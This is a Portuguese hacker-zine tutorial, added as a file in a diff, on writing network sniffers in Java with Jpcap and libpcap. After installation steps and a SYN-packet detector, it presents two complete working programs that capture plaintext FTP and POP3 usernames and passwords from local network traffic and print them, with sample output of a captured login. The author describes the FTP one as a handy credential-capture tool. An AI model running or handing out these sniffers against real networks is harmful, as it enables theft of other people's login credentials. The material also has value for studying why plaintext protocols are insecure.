@@ -1,0 +1,501 @@
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+=-[14]-=[Implementando um Sniffer em Java]=-|tDs|-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+--=[ Introducao
+
+	Manipular raw sockets normalmente nao e' uma tarefa muito simples e pode
+tornar-se bastante ingrata quando nao se tem um conhecimento amplo sobre tcp/ip
+(o que e' o meu caso).  Escrever codigo em java tambem nao e' uma tarefa  muito
+gratificante  (no comeco),  pois parece que ao inves de facilitar o trabalho de
+programar,  ela dificulta (ou vai dizer que e' legal ter que ficar tratando ex-
+ceptions por todo o codigo?). Veremos aqui uma brevissima introducao 'a lingua-
+gem java, atraves da utilizacao de simples exemplos, ou seja,  nao serao expli-
+cados conceitos por tras da linguagem,  e apos isso como  trabalhar com raw so-
+ckets utilizando java (em ambiente linux).
+
+
+
+--=[ Instalando J2SESDK
+
+	J2SESDK - Java 2 Standard Edition Software Development Kit - fornece um
+ambiente completo para o desenvolvimento de aplicacoes em java. Caso ja o tenha
+instalado, nao e' necessario a leitura desta parte do texto.
+
+	Apos efetuar a copia de J2SDK em [3] (a instalacao sera feita utilizando
+o "self-extracting-file", no diretorio /usr/local), a instalacao e' dada da se-
+guinte forma:
+  
+    # cd /usr/local
+    # chmod +x j2sdk-1_4_2_<version>-linux-i586.bin
+    # ./j2sdk-1_4_2_<version>-linux-i586.bin
+     Aceite a licenca [yes]
+    # rm j2sdk-1_4_2_<version>-linux-i586.bin
+    # ln -s /usr/local/j2sdk1.4.2_<version> /usr/local/java
+    # echo "export JAVA_HOME=/usr/local/java" >> /etc/profile
+    # echo "PATH=$JAVA_HOME/bin:$PATH" >> /etc/profile
+  
+	Apos esse procedimento, podemos escrever um simples "HelloWorld.java",
+para testarmos a instalacao (e' necessario efetuar um novo login para que as
+mudancas de PATH e de localizacao do java surtam efeito)
+  
+
+<++> java/HelloWorld.java
+/**
+ * Simples hello world em java
+ * by tDs tds@motdlabs.org
+ *
+ * Compile com $javac HelloWorld.java
+ */
+public class HelloWorld {
+    public static void main(String[] args) {
+	System.out.println ("Hello World");
+	System.exit(0);
+    }
+}			  
+<--> java/HelloWorld.java
+
+    Compile e execute o programa:
+    $ javac HelloWorld.java
+    $ java HelloWorld 
+    Hello World
+    $
+    
+Verificado entao que a instalacao do java foi feita corretamente.
+
+
+
+--=[ Instalando LIBPCAP
+
+	Java nao tem suporte nativo a raw sockets, sendo necessario para isso a 
+utilizacao da libpcap.  A libpcap nos disponibiliza uma interface em alto nivel 
+para desenvolvimento de sistemas de captura de pacotes.  Primeiro e' necessario
+efetuar o download em [1]. A versao utilizada foi a 0.8.3. A instalacao e' bas-
+tante simples:
+
+    $ tar xzvf libpcap-0.8.3.tar.gz
+    $ cd libpcap-0.8.3
+    $ ./configure
+    $ make
+    # make install
+
+Informacoes detalhadas sobre a libpcap podem ser encotradas em sua man page:
+  
+    $ man pcap
+
+Uma vez com o J2SDK e a libpcap instalados, e' necessaria a instalacao da Jpcap.
+
+
+
+--=[ Instalando JPCAP
+
+	Jpcap e' um conjunto de classes que prove meios para captura de pacotes
+(sim faz o mesmo que a libpcap mas faz isso utilizando-a). E' necessario efetuar
+o download dela em [2]. A versao utilizada foi a 0.01.16. A instalacao e' efetu-
+ada da seguinte forma:
+  
+    $ tar xzvf jpcap-0.01.16.tar.gz
+    # cp jpcap-0.01.16/lib/libjpcap.so $JAVA_HOME/jre/lib/i386/ 
+    # cp jpcap-0.01.16/jars/net.sourceforge.jpcap-0.01.16.jar \
+      $JAVA_HOME/jre/lib/ext/
+    # echo "export CLASSPATH=\"$JAVA_HOME/jre/lib/ext/net.sourceforge.jpcap-0.01.16.jar\""
+  
+	A instalacao do que sera necessario para iniciarmos em java esta conclu-
+ida. Apenas tenha certeza de que tudo foi corretamente instalado e esta funcio-
+nando (o proximo exemplo nos dara certeza disso, portanto, compile-o).
+
+
+
+--=[ A Linguagem Java
+
+	Java e' uma linguagem  robusta,  com uma utilizacao muito grande,  indo
+desde simples smart-cards, passando por telefone celular e indo ate'super-compu-
+tadores. Diferentemente de outras linguagens, o compilador java nao gera codigo
+em "linguagem de maquina", que e' a representacao que "os computadores entendem"
+, ao inves disso ele gera um "bytecode",  que e' uma representacao interpretada
+pela maquina virtual java (JVM). Ou seja, java nao e' nem compilada, como a lin-
+guagem C por exemplo, e nem interpretada, como PHP ou PERL. Para desenvolver em
+java, e' necessario ter um conhecimento, mesmo que minimo,  sobre o conceito de
+"orientacao a objeto" (OOP), que e' uma forma de manipulacao e armazenamento de
+dados diferente da utilizada em linguagens estruturadas. Um aprofundamento sobre
+programacao em java pode ser encontrado em [4].
+
+
+
+--=[ Iniciando o uso de JPCAP
+
+	Indo diretamente a exemplos, comecamos com um que lista os dispositivos
+disponiveis na maquina:
+
+<++> java/ListaDispositivos.java
+import net.sourceforge.jpcap.capture.*;
+import net.sourceforge.jpcap.net.*;
+
+/**
+ * Lista os dispositivos de rede presente na maquina
+ * by tDs tds@motdlabs.org
+ *
+ * Compile com $javac ListaDispositivos.java
+ */
+public class ListaDispositivos {
+    
+    // Cria uma instancia de PacketCapture, que sera o objeto responsavel pela
+    // manipulacao das interfaces de rede (neste caso).
+    private static PacketCapture mPcap = new PacketCapture();
+    
+    public static void main(String[] args) {
+        try {
+            // Obtem uma lista com as interfaces disponiveis
+            String dev[] = mPcap.lookupDevices();
+            System.out.println ("Foram encontrados " + dev.length + " dispositivos:");
+            //exibe cada dispositivo encontrado
+            for (int cont = 0; cont < dev.length; cont++)
+                System.out.println ("  - " + dev[cont]);
+        } catch (Exception e) {}
+    }
+    
+}
+
+<--> java/ListaDispositivos.java
+
+	Apenas lendo os comentarios do codigo conseguimos ter um perfeito enten-
+dimento do que ele faz. Executando-o como root vemos o seguinte (que pode e cer-
+tamente sera diferente):
+
+    # javac ListaDispositivos.java
+    # java -cp . ListaDispositivos
+    PacketCapture: loading native library jpcap.. ok
+    Foram encontrados 4 dispositivos:
+      - lo
+      - eth0
+      - eth1
+      - ppp0
+    #
+
+	O comando "java -cp . ListaDispositivos" executa a classe ListaDisposi-
+tivos.class (que foi previamente compilado com "javac ListaDispositivos.java"),
+informando que o classpath (localizacao das classes)  e' o diretorio corrente
+( "." ).  Note que nao e' necessario informar o nome do arquivo que sera execu-
+tado, mas somente o nome da classe, que neste caso e' "ListaDispositivos". 
+Observe que somente o root pode executar. No caso de um usuario sem privilegios,
+teriamos o seguinte:
+
+        $ java -cp . ListaDispositivos
+        PacketCapture: loading native library jpcap.. ok
+        Foram encontrados 0 dispositivos:
+        $
+
+	O exemplo seguinte vai exibir todos os pacotes que estejam iniciando uma
+conexao em algum servico local. A verificacao e' dada atraves do bit SYN setado,
+estando o ACK em 0. Apenas lembrando, uma conexao tcp e' estabelecida pelo cha-
+mado "Three Way Handshake", ou algo como "Triplo aperto de maos". Funciona mais
+ou menos assim:
+    
+    - Host A, que vai conectar-se em Host B envia um pacote com a flag SYN, de 
+    syncronize, que solicita ao Host B uma sincronizacao de "sequence numbers",
+    que sao os numeros de sequencia de pacotes tcp.
+    - Host B quando recebe o pacote com a flag SYN setada, responde ao Host A
+    com um outro pacote, tendo as flags SYN e ACK, de Acknowledgement, setadas.
+    - Host A envia entao um terceiro pacote, com a flag ACK setada. Apos isso a
+    conexao e' estabelecida.
+    
+	Com isso em mente e' possivel perceber como podemos verificar se um pa-
+cote que chega e' ou nao o pedido de uma nova conexao. Vamos ao exemplo:
+
+
+<++> java/CapturaInicioConexao.java
+import net.sourceforge.jpcap.capture.*;
+import net.sourceforge.jpcap.net.*;
+
+/**
+ * Exibe todos os pacotes que sejam enviados em pedidos de conexao
+ * a servicos locais
+ * by tDs tds@motdlabs.org
+ *
+ * Compile com $javac CapturaInicioConexao.java
+ */
+public class CapturaInicioConexao {
+    private static final String FILTER = "proto TCP";
+    private static String devHandler;
+    
+    
+    // Cria uma instancia de PacketCapture, que sera o objeto responsavel pela
+    // manipulacao das interfaces de rede (neste caso).
+    private static PacketCapture pcap = new PacketCapture();
+    
+    public static void main(String[] args) {
+        try {
+            // Obtem uma lista com as interfaces disponiveis
+            // e assina mDevice com o primeiro encontrado
+            String dev[] = pcap.lookupDevices();
+            devHandler = dev[0];
+            
+            // abre inteface para iniciar captura de pacotes
+            pcap.open(devHandler, true);
+            
+            // adiciona um filtro (protocolo = TCP) para captura de dados
+            pcap.setFilter(FILTER, true);
+            
+            // registra um RawPacketListener, que e' o objeto que vai
+            // "ler/escutar" os pacotes que nos interessa
+            pcap.addPacketListener(new PacketHandler());
+            
+            // inicia captura de pacotes
+            pcap.capture(-1);
+        } catch (Exception e) {}
+    }
+    
+}
+
+/**
+ * cria um packet listener, que ira receber os pacores enviados
+ * por um PacketCapture que o registre
+ */
+class PacketHandler implements PacketListener {
+    private static int pcounter = 0;
+    
+    public void packetArrived(Packet pacote) {
+        TCPPacket tcp = (TCPPacket) pacote;
+        
+        // feita uma verificacao se o bit SYN esta setado
+        // e mais nenhum outro
+        if (tcp.isSyn() && !tcp.isAck() && !tcp.isFin() 
+			&& !tcp.isPsh() && !tcp.isRst() ) {
+            pcounter++;
+            System.out.println("Recebendo pedido de conexao na porta " + 
+				tcp.getDestinationPort() + ".");
+            System.out.println("Endereco: " + tcp.getSourceAddress());
+        }
+    }
+}
+<--> java/CapturaInicioConexao.java
+
+
+    Executando temos o seguinte:
+
+    # java -cp . CapturaInicioConexao
+    PacketCapture: loading native library jpcap.. ok
+
+    Em outro terminal, executamos o seguinte:
+
+    $ telnet localhost 223
+    Trying 127.0.0.1...
+    telnet: connect to address 127.0.0.1: Connection refused
+    $ 
+
+    Voltando para a captura de pacotes:
+        
+    # java -cp . CapturaInicioConexao
+    PacketCapture: loading native library jpcap.. ok
+    Recebendo pedido de conexao na porta 223.
+    Endereco: 127.0.0.1
+
+
+	E' possivel observar com esse exemplo acima a facilidade de manipulacao
+de pacotes.  Este proximo exemplo captura pacotes  destinados a porta 21 (ftp).
+Apos a captura sao feitas algumas analises para verificar se o usuario fez login
+corretamente. Caso tenha feito, exibe o nome e a senha utilizadas para isso.
+
+<++> java/FtpGetLogin.java
+import net.sourceforge.jpcap.capture.*;
+import net.sourceforge.jpcap.net.*;
+import java.lang.*;
+
+/**
+ * Exibe nome de usuario e senha de tentativas de login bem efetuadas localmente
+ * by tDs tds@motdlabs.org
+ *
+ * Compile com $javac FtpGetLogin.java
+ */
+public class FtpGetLogin {
+    private static final String FILTER = "proto TCP and port 21";
+    private static String devHandler;
+    private static PacketCapture pcap = new PacketCapture();
+    
+    public static void main(String[] args) {
+        try {
+            String dev[] = pcap.lookupDevices();
+            devHandler = dev[0];
+            
+            pcap.open(devHandler, true);
+            
+            pcap.setFilter(FILTER, true);
+            
+            pcap.addPacketListener(new PacketHandler());
+            
+            pcap.capture(-1);
+        } catch (Exception e) {
+            System.out.println(e.getMessage());
+        }
+    }
+    
+}
+
+class PacketHandler implements PacketListener {
+    private static String USER  = "";
+    private static String PASS  = "";
+    private static boolean FLAG = false;
+    public void packetArrived(Packet pacote) {
+        // faz um cast do pacote recebido para um tipo TCPPacket
+        TCPPacket tcp = (TCPPacket) pacote;
+        
+        // Obtem o conteudo do campo DATA do pacote TCP
+        byte d[] = tcp.getTCPData();
+        StringBuffer data = new StringBuffer();
+        for (int c = 0; c < d.length; c++) 
+            data.append( (char) d[c]);
+
+        // verifica se foi informado usuario/senha e assina o valor a eles
+        if (data.toString().indexOf("USER") != -1)
+            USER = data.toString().replaceAll("USER","").trim();
+        if (data.toString().indexOf("PASS") != -1) 
+            PASS = data.toString().replaceAll("PASS","").trim();
+
+        
+        // cod. 230 indica que efetuou login corretamente, levanta uma flag
+        if (data.toString().indexOf("230") != -1)
+            FLAG = true;
+
+        // cod. 530 indica que nao efetuou login corretamente, apaga info sobre
+        // usuario e senha
+        if (data.toString().indexOf("530") != -1)
+            USER = PASS = "";
+        
+        // caso tenha se logado, informa o user e a senha
+        if (FLAG) {
+            System.out.println("Recebendo conexao ftp...");
+            System.out.println("Usuario: " + USER);
+            System.out.println("Senha: "   + PASS + "\n");
+            FLAG = false;
+        }
+    }
+}
+<--> java/FtpGetLogin.java
+
+    Executando temos o seguinte:
+
+    # java -cp . FtpGetLogin
+    PacketCapture: loading native library jpcap.. ok
+
+    Em outro terminal, efetuamos um login via ftp:        
+    $ ftp localhost
+    Connected to localhost.
+    220 ProFTPD 1.2.9 Server (tDs's FTP) [matrix.net]
+    Name (localhost:tds): dumb
+    331 Password required for dumb.
+    Password:
+    230 User dumb logged in.
+    Remote system type is UNIX.
+    Using binary mode to transfer files.
+
+    Voltando para a captura de logins:
+
+    # java -cp . FtpGetLogin
+    PacketCapture: loading native library jpcap.. ok
+    Recebendo conexao ftp...
+    Usuario: dumb
+    Senha: senha
+
+
+	Observa-se que,  com aproximadamente 70 linhas de codigo,  e' possivel
+fazer uma ferramenta util para captura de usuarios e senhas de ftp. Vamos a mais
+um exemplo:
+
+<++> java/PopGetLogin.java
+import net.sourceforge.jpcap.capture.*;
+import net.sourceforge.jpcap.net.*;
+import java.lang.*;
+
+/**
+ * Exibe nome de usuario e senha de tentativas de login bem efetuadas localmente
+ * by tDs tds@motdlabs.org
+ *
+ * Compile com $javac PopGetLogin.java
+ */
+public class PopGetLogin {
+    private static final String FILTER = "proto TCP and port 110";
+    private static String devHandler;
+    private static PacketCapture pcap = new PacketCapture();
+
+    public static void main(String[] args) {
+        try {
+            String dev[] = pcap.lookupDevices();
+            devHandler = dev[0];
+
+            pcap.open(devHandler, true);
+
+            pcap.setFilter(FILTER, true);
+
+            pcap.addPacketListener(new PacketHandler());
+
+            pcap.capture(-1);
+        } catch (Exception e) {
+            System.out.println(e.getMessage());
+        }
+    }
+
+}
+class PacketHandler implements PacketListener {
+    private static String USER  = "";
+    private static String PASS  = "";
+    private static boolean FLAG = false;
+    public void packetArrived(Packet pacote) {
+        // faz um cast do pacote recebido para um tipo TCPPacket
+        TCPPacket tcp = (TCPPacket) pacote;
+
+        // Obtem o conteudo do campo DATA do pacote TCP
+        byte d[] = tcp.getTCPData();
+        StringBuffer data = new StringBuffer();
+        for (int c = 0; c < d.length; c++)
+            data.append( (char) d[c]);
+
+        // verifica se foi informado usuario/senha e assina o valor a eles
+        if (data.toString().indexOf("USER") != -1)
+            USER = data.toString().replaceAll("USER","").trim();
+        if (data.toString().indexOf("PASS") != -1)
+            PASS = data.toString().replaceAll("PASS","").trim();
+
+
+        // +OK ? indica que efetuou login corretamente, levanta uma flag
+        if (data.toString().indexOf("OK") != -1 && USER.length() > 1 
+	    && PASS.length() > 1)
+            FLAG = true;
+
+        // -ERR ? indica que nao efetuou login corretamente, apaga info sobre
+        // usuario e senha
+        if (data.toString().indexOf("-ERR") != -1)
+            USER = PASS = "";
+
+        // caso tenha se logado, informa o user e a senha
+        if (FLAG && USER.length() > 1 && PASS.length() > 1) {
+            System.out.println("Recebendo conexao POP3...");
+            System.out.println("Usuario: " + USER);
+            System.out.println("Senha: "   + PASS + "\n");
+            FLAG = false;
+	    USER = PASS = "";
+        }
+    }
+}
+<--> java/PopGetLogin.java
+
+
+	Observa-se a grande semelhanca entre o sniffer para FTP e o sniffer para
+POP3 e a simplicidade de ambos.
+
+
+
+--=[ Agradecimentos e Links/Referencias
+
+	Pessoal da scene brasileira toda, em especial ao pessoal que converso
+com maior frequencia. Voces sabem quem sao voces.
+
+	Informacao e' simples de se adquirir, internet esta cheia disso. Basta
+saber procurar...
+
+[1] http://www.tcpdump.org/release/libpcap-0.9.0-096.tar.gz
+[2] http://sourceforge.net/projects/jpcap
+[3] http://java.sun.com/j2se/1.4.2/download.html
+[4] http://www.ic.unicamp.br/~cmrubira/aacesta/java/javatut.html
+
+
+_EOF_
